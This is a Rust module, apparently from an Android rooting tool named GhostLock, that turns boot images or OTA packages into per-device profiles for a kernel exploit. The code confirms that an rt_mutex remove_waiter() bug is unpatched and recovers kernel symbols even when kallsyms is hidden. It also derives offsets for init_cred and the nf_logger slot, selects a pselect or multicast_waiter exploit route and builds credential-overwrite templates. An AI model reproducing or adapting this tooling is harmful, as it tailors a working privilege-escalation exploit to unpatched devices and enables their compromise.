//! GhostLock profile 提取：boot.img / Image / payload.bin / OTA ZIP / http(s) URL
//! → 自包含的 GLK HOCON 文本。
//!
//! 全部计算来自 `ghostlock_extract`（上游 423ccb1）。本模块只做参数编排与
//! 告警收集，不复制任何提取算法，因此上游更新时只需同步本文件的调用顺序。
//!
//! 与上游 CLI（`extract_rs/src/main.rs`）的差异：
//! - 只实现 `--format conf` 一条路径，JSON/text 输出不搬；
//! - 无 CLI 解析、无 stdout 打印：告警收进 [`Derived::warnings`] 由调用方展示；
//! - 内核已修复 `remove_waiter()` 时直接返回错误（CLI 的 `--analysis` 旁路不搬）。

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::sync::Arc;

use crate::ProgressFn;

use ghostlock_extract::analysis;
use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
use ghostlock_extract::btf::Btf;
use ghostlock_extract::derive::{
    derive_cred_5x, derive_nf_logger_registration, derive_pselect_layout,
    ensure_rtmutex_43499_unpatched, multicast_waiter_off, relative_symbols,
    PSELECT_ROUTE_NFDS,
};
use ghostlock_extract::error::{ExtractError, Result};
use ghostlock_extract::fdt::{recover_kernel_phys_load, recover_kernel_phys_load_from_uefi};
use ghostlock_extract::iomem;
use ghostlock_extract::kallsyms;
use ghostlock_extract::kallsyms::Kallsyms;
use ghostlock_extract::kallsyms_finder;
use ghostlock_extract::payload;
use ghostlock_extract::report;
use ghostlock_extract::symbols::{
    kernel_layout_verified, kernel_struct_macro, resolve_structs, resolve_symbols,
};

/// 提取结果。
pub struct Derived {
    /// 内核 release，与 `uname -r` 逐字可比。
    pub release: String,
    /// 自包含的 GLK profile（HOCON，无 `include`）。
    pub conf: String,
    /// 提取过程中的告警；不阻断，但调用方应展示。
    pub warnings: Vec<String>,
    /// 实际参与解析的 boot 镜像路径。
    ///
    /// OTA / payload 输入时指向解包后落在 `work_dir` 下的文件，调用方可以用
    /// 它复用同一份镜像，避免为另一套表再下载一次。
    pub boot_path: String,
}

/// 提取 profile。
///
/// `input` 可以是本地路径（boot.img / Image / payload.bin / OTA zip）或
/// `http(s)` 直链。`work_dir` 由调用方给出（App 的 cacheDir），中间产物落在
/// 其下 `ghostlock/`。
///
/// `progress` 是可选回调 `(phase, done, total)`：phase 0 = 下载（字节），
/// 1 = 解包与解析（无确定总量，`total` 为 0）。纯计算阶段不逐条上报。
pub fn derive_profile(
    input: &str,
    work_dir: &Path,
    _insecure: bool,
    progress: Option<Arc<ProgressFn>>,
) -> Result<Derived> {
    let mut warnings: Vec<String> = Vec::new();

    let report = |phase: u32, done: u64, total: u64| {
        if let Some(cb) = &progress {
            cb(phase, done, total);
        }
    };

    /* ---- 1. 输入归一：payload / OTA 先解出 boot ---- */
    let mut boot_path = PathBuf::from(input);
    let mut xbl_path: Option<PathBuf> = None;
    let mut uefi_path: Option<PathBuf> = None;

    if payload::looks_like_payload(input) {
        let payload_work: PathBuf = work_dir.join("ghostlock-payload");
        let meta_view = payload::open_payload_meta(input)
            .map_err(|err| ExtractError::new(format!("{err:#}")))?;
        let want = payload::analysis_partition_names(&meta_view)
            .map_err(|err| ExtractError::new(format!("{err:#}")))?;
        let download_cb: Option<payload_extract::input::ProgressCallback> =
            progress.as_ref().map(|cb| {
                let cb = Arc::clone(cb);
                Arc::new(move |done: u64, total: u64| cb(0, done, total))
                    as payload_extract::input::ProgressCallback
            });
        let payload_view = payload::open_payload_for(input, &payload_work, &want, download_cb)
            .map_err(|err| ExtractError::new(format!("{err:#}")))?;
        report(1, 0, 0);
        let (extracted_boot, extracted_xbl, extracted_uefi) =
            payload::extract_analysis_inputs(&payload_view, &payload_work)
                .map_err(|err| ExtractError::new(format!("{err:#}")))?;
        boot_path = extracted_boot;
        xbl_path = extracted_xbl;
        uefi_path = extracted_uefi;
    }

    report(1, 0, 0);

    /* ---- 2. boot 解包 ---- */
    let boot = BootImage::load(&boot_path)?;

    /* ---- 3. kernel_phys_load：xbl_config FDT → uefi memory map → iomem ---- */
    let mut kernel_phys_load: Option<u64> = None;
    if let Some(xbl) = &xbl_path {
        match recover_kernel_phys_load(xbl) {
            Ok(phys) => kernel_phys_load = Some(phys),
            Err(err) => warnings.push(format!(
                "xbl_config FDT parse failed: {err}; trying the uefi memory map"
            )),
        }
    }
    if kernel_phys_load.is_none() {
        if let Some(uefi) = &uefi_path {
            match recover_kernel_phys_load_from_uefi(uefi) {
                Ok(phys) => kernel_phys_load = Some(phys),
                Err(err) => warnings.push(format!(
                    "uefi memory-map parse failed: {err}; proceeding with boot-only analysis"
                )),
            }
        }
    }

    /* ---- 4. kallsyms：/proc/kallsyms 优先，否则从镜像内嵌表恢复 ---- */
    let btf_at = boot.embedded_btf_at();
    let ks = resolve_kallsyms(&boot, btf_at.as_ref().map(|(off, blob)| (*off, blob.len())))?;
    let symbols = ks.symbols;
    let text_base = kallsyms::unique(&symbols, "_text");
    let base = text_base.or_else(|| kallsyms::unique(&symbols, "_head"));
    let Some(base) = base else {
        return Err(ExtractError::new("_text/_head is not unique in kallsyms"));
    };

    /* ---- 5. /proc/iomem：DRAM 基址，必要时反推 kernel_phys_load ---- */
    let mut kernel_phys_offset: Option<u64> = None;
    let iomem_info = match iomem::load(None) {
        Ok(info) => info,
        Err(err) => {
            warnings.push(err.to_string());
            None
        }
    };
    if let Some(info) = iomem_info {
        kernel_phys_offset = info.dram_base;
        if kernel_phys_load.is_none() {
            if let (Some(kc), Some(text), Some(stext)) = (
                info.kernel_code_start,
                kallsyms::unique(&symbols, "_text"),
                kallsyms::unique(&symbols, "_stext"),
            ) {
                let delta = stext.wrapping_sub(text) & 0xffff_ffff;
                kernel_phys_load = Some(kc.wrapping_sub(delta) & 0xffff_ffff);
            }
        }
    }

    /* ---- 6. 漏洞是否存在：remove_waiter() 已修则整条链不成立 ---- */
    let (rel_symbols, sorted_offsets) = relative_symbols(&symbols, base);
    ensure_rtmutex_43499_unpatched(&boot.kernel, &rel_symbols, &sorted_offsets)
        .map_err(|err| ExtractError::new(format!("primitive absent: {err}")))?;

    /* ---- 7. BTF ---- */
    let btf_raw = btf_at.as_ref().map(|(_, blob)| blob.clone());
    let btf = btf_raw.as_deref().map(Btf::new).transpose()?;
    if btf.is_none() {
        warnings.push(
            "embedded BTF not found; symbols come from kallsyms and struct offsets fall back \
             to target.h defaults"
                .to_string(),
        );
    }

    /* ---- 8. release 与 MediaTek 物理基址 ---- */
    let release = boot.release();
    match release.as_deref() {
        Some(text) => {
            if !kernel_layout_verified(Some(text)) {
                let template = kernel_struct_macro(Some(text));
                warnings.push(format!(
                    "{text} is unverified{}; no family-derived geometry will be emitted",
                    template.map_or(String::new(), |name| format!(" (template {name} only)"))
                ));
            }
        }
        None => warnings.push("boot image carries no kernel release string".to_string()),
    }
    if kernel_phys_load.is_none() && (boot.mtk_lz4 || boot.mtk_gzip) {
        if let Some(text_base) = text_base {
            match text_base.checked_sub(MTK_VADDR_BASE) {
                Some(derived) if derived == MTK_DEFAULT_PHYS_LOAD => {
                    kernel_phys_load = Some(derived);
                }
                _ => warnings.push(format!(
                    "_text=0x{text_base:x} does not match the mtk DRAM-base mapping; \
                     kernel_phys_load left unset so the runtime derives it"
                )),
            }
        } else {
            warnings.push(
                "MediaTek compressed image; _text unavailable, leaving kernel_phys_load unset \
                 so the runtime derives it"
                    .to_string(),
            );
        }
    }

    /* ---- 9. 符号与结构体偏移 ---- */
    let mut symbol_offsets = resolve_symbols(&symbols, base);

    /* 9.1 pselect 布局与 nf_logger 槽 —— 只有反汇编可得 */
    let mut derived: BTreeMap<String, u64> = BTreeMap::new();
    let mut pselect_infeasible: Option<String> = None;
    if let Some(btf) = &btf {
        match derive_pselect_layout(
            &boot.kernel,
            &rel_symbols,
            &sorted_offsets,
            btf,
            PSELECT_ROUTE_NFDS,
        ) {
            Ok(layout) => {
                derived.insert(
                    "pselect_waiter_shift_value".to_string(),
                    (layout.shift as i64 - 2) as u64,
                );
            }
            Err(ExtractError::Infeasible(message)) => {
                warnings.push(format!(
                    "pselect route not feasible on this kernel: {message}"
                ));
                pselect_infeasible = Some(message);
            }
            Err(err) => warnings.push(format!("pselect_waiter_shift derivation failed: {err}")),
        }
        match derive_nf_logger_registration(&boot.kernel, &rel_symbols, &sorted_offsets, btf) {
            Ok(info) => {
                derived.insert("off_slide_loggers_0_1".to_string(), info.loggers_0_1);
            }
            Err(err) => warnings.push(format!("loggers_0_1 derivation failed: {err}")),
        }
    } else {
        warnings.push(
            "no BTF; loggers_0_1 falls back to the loggers+0x10 heuristic".to_string(),
        );
    }

    let pselect_shift = derived
        .get("pselect_waiter_shift_value")
        .copied()
        .map(|value| value as i64)
        .or_else(|| {
            /* infeasible 时不套用 family 默认值：该镜像没有这条布局 */
            if pselect_infeasible.is_some() {
                return None;
            }
            report::pselect_waiter_shift_for(release.as_deref())
        });
    if let Some(slot) = derived.get("off_slide_loggers_0_1").copied() {
        symbol_offsets.insert("off_slide_loggers_0_1".to_string(), Some(slot));
    }

    /* 9.2 结构体偏移 */
    let struct_offsets = resolve_structs(btf.as_ref());

    /* 9.3 可选符号缺失时填 0（运行期回退 target.h 默认值） */
    let missing: Vec<String> = symbol_offsets
        .iter()
        .filter(|(_, value)| value.is_none())
        .map(|(key, _)| key.clone())
        .collect();
    let tolerated: BTreeSet<String> = report::optional_symbols()
        .into_iter()
        .map(str::to_string)
        .collect();
    let mut tolerated_missing: Vec<String> = missing
        .iter()
        .filter(|key| tolerated.contains(*key))
        .cloned()
        .collect();
    tolerated_missing.sort();
    for key in &tolerated_missing {
        symbol_offsets.insert(key.clone(), Some(0));
        warnings.push(format!(
            "{key} not found in kallsyms; emitted 0x00000000 (runtime falls back to \
             target.h default)"
        ));
    }

    /* ---- 10. conf 是候选产物：缺字段留给 app 的校验去报 ---- */
    if let Err(err) = report::require_fields(&symbol_offsets, &BTreeSet::new()) {
        warnings.push(format!("{err}; writing an unverified candidate"));
    }
    if btf.is_some() {
        let struct_fields_u64: BTreeMap<String, Option<u64>> = struct_offsets
            .iter()
            .map(|(key, value)| (key.clone(), value.map(|v| v as u64)))
            .collect();
        if let Err(err) =
            report::require_fields(&struct_fields_u64, &report::optional_struct_fields())
        {
            warnings.push(format!("{err}; writing an unverified candidate"));
        }
    }

    /* ---- 11. route 选择 ---- */
    let release_text = release
        .as_deref()
        .ok_or_else(|| ExtractError::new("profile needs a kernel release string"))?;
    let major = release_text
        .split('.')
        .next()
        .and_then(|part| part.parse::<u32>().ok());
    if major != Some(5) && major != Some(6) {
        return Err(ExtractError::new(format!(
            "profile needs a 5.x/6.x release, got {release_text}"
        )));
    }

    let route = {
        let paths = analysis::probe_paths(&symbols, &boot.kernel, &rel_symbols, &sorted_offsets);
        let pselect_derived = derived.contains_key("pselect_waiter_shift_value");
        let (suggested, _, _) = analysis::suggest_route(pselect_derived, &paths, release.as_deref());
        suggested.map(str::to_string)
    };
    if route
        .as_deref()
        .is_some_and(analysis::route_depends_on_pselect_layout)
    {
        if let Some(message) = &pselect_infeasible {
            return Err(ExtractError::new(format!(
                "pselect route not feasible on this kernel: {message}"
            )));
        }
    }

    /* 11.1 路由几何；multicast 的 waiter_off/buffer_size 必须镜像内推导得出 */
    let mut geometry = route
        .as_deref()
        .map(|name| {
            report::conf_route_geometry(name, release_text, pselect_shift, &struct_offsets)
        })
        .unwrap_or_default();
    if route.as_deref() == Some("multicast_waiter") {
        const MCAST_BUFFER_SIZE: u64 = 264;
        const RT_MUTEX_WAITER_PI_TREE_ENTRY: u64 = 0x18;
        match multicast_waiter_off(
            &boot.kernel,
            &rel_symbols,
            &sorted_offsets,
            MCAST_BUFFER_SIZE,
            RT_MUTEX_WAITER_PI_TREE_ENTRY,
        ) {
            Ok(geom) => {
                for entry in geometry.iter_mut() {
                    if entry.0 == "waiter_off" {
                        entry.1 = geom.waiter_off as i64;
                    }
                }
            }
            Err(err) => warnings.push(format!(
                "static multicast waiter_off derivation failed: {err}; keeping the proven 5.x constant"
            )),
        }
    }
    match route.as_deref() {
        Some(name) if geometry.is_empty() => warnings.push(format!(
            "no image-derived geometry for route {name}; writing an unverified candidate \
             route branch"
        )),
        None => warnings.push(
            "no route could be inferred; writing release/common fields only".to_string(),
        ),
        Some(_) => {}
    }
    if route.as_deref() == Some("multicast_waiter")
        && !geometry.iter().any(|(key, _)| *key == "task_offset")
    {
        warnings.push(
            "rt_mutex_waiter task/lock offsets are missing from BTF; the multicast geometry \
             is partial"
                .to_string(),
        );
    }

    /* ---- 12. credential 模板：5.x 反汇编推导，6.x 用共享常量 ---- */
    let cred: Vec<(String, String)> = if major == Some(5) {
        let derived_cred = btf.as_ref().and_then(|btf| {
            let init_cred_off = symbol_offsets.get("off_init_cred").copied().flatten()?;
            let size = btf.size("cred")?;
            match derive_cred_5x(btf, &boot.kernel, init_cred_off) {
                Ok(cred) => Some(report::conf_cred_5x(&cred, size)),
                Err(err) => {
                    warnings.push(format!("5.x credential derivation failed: {err}"));
                    None
                }
            }
        });
        match derived_cred {
            Some(cred) => cred,
            None => {
                warnings.push(
                    "credential template omitted; the built-in profile must supply it"
                        .to_string(),
                );
                Vec::new()
            }
        }
    } else {
        report::conf_cred_6x()
    };

    let extra_offsets = report::ConfExtraOffsets {
        empty_zero_page: kallsyms::unique(&symbols, "empty_zero_page")
            .and_then(|value| value.checked_sub(base)),
        /* vr.ko 的 guard 目标：GhostLock 原生侧从不读取，85 份内置表也都没有这个键。
         * 上游 CLI 只有在内核暴露 __tracepoint_sys_exit 时才推导，这里直接留空。 */
        sys_exit_tp_funcs: None,
    };

    let conf = report::render_conf(&report::ConfInputs {
        release: release_text,
        phys: kernel_phys_load,
        /* DRAM 基址：只有在 rooted 设备上读到 /proc/iomem 时才有值 */
        phys_offset: kernel_phys_offset,
        symbols: &symbol_offsets,
        structs: &struct_offsets,
        route: route.as_deref(),
        route_geometry: &geometry,
        cred: &cred,
        extra_offsets: &extra_offsets,
    });

    report(2, 1, 1);
    Ok(Derived {
        release: release_text.to_string(),
        conf,
        warnings,
        boot_path: boot_path.to_string_lossy().into_owned(),
    })
}

/// 取 kallsyms：先试 `/proc/kallsyms`，全部为 0（`kptr_restrict`）时视为不可用。
fn resolve_kallsyms(
    boot: &BootImage,
    btf_at: Option<(usize, usize)>,
) -> Result<Kallsyms> {
    let proc_ksyms = Path::new("/proc/kallsyms");
    if proc_ksyms.is_file() && std::fs::File::open(proc_ksyms).is_ok() {
        if let Ok(text) = std::fs::read_to_string(proc_ksyms) {
            if let Ok(ks) = kallsyms::parse(&text) {
                if ks
                    .symbols
                    .values()
                    .any(|addrs| addrs.iter().any(|&a| a != 0))
                {
                    return Ok(ks);
                }
            }
        }
    }
    kallsyms_finder::recover(&boot.kernel, btf_at)
        .map_err(|err| ExtractError::kallsyms(err.to_string()))
}
